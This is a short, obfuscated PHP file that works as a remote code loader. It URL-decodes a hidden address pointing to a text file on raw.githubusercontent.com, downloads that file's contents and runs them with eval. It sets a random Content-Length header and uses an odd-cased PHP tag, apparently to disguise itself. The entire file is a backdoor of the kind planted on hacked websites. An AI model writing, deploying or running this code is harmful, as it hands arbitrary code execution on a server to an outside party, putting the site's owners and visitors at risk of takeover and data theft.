<?pHp
$x = rand(1, 999999);
header('Content-Length: ' . $x);
$h = fopen(rawurldecode('%68%74%74%70%73%3A%2F%2F%72%61%77%2E%67%69%74%68%75%62%75%73%65%72%63%6F%6E%74%65%6E%74%2E%63%6F%6D%2F%42%61%63%6B%6C%69%6E%6B%47%47%2F%76%69%70%76%32%2F%6D%61%69%6E%2F%73%79%73%74%65%6D%2E%74%78%74'), "r");
$c = stream_get_contents($h);
fclose($h);
eval(rawurldecode('%3f%3e').$c);
?>
